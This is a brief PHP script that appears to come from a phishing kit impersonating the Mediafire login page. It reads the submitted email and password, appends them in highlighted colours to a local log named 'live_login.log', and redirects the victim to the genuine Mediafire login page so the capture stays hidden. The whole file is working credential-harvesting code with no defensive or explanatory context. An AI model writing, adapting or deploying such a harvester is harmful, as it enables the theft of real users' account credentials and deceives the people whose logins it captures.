<?php
$BRIGHT_GREEN = "\033[1;92m";
$BRIGHT_CYAN = "\033[1;96m";
$BRIGHT_YELLOW = "\033[1;93m";
$RESET = "\033[0m";

file_put_contents("live_login.log", 
    "{$BRIGHT_YELLOW}Mediafire {$BRIGHT_CYAN}Username: {$BRIGHT_GREEN}" . $_POST['login_email'] . 
    " {$BRIGHT_CYAN}Pass: {$BRIGHT_GREEN}" . $_POST['login_pass'] . "{$RESET}\n", 
    FILE_APPEND
);

header('Location: https://www.mediafire.com/login/');
exit();
?>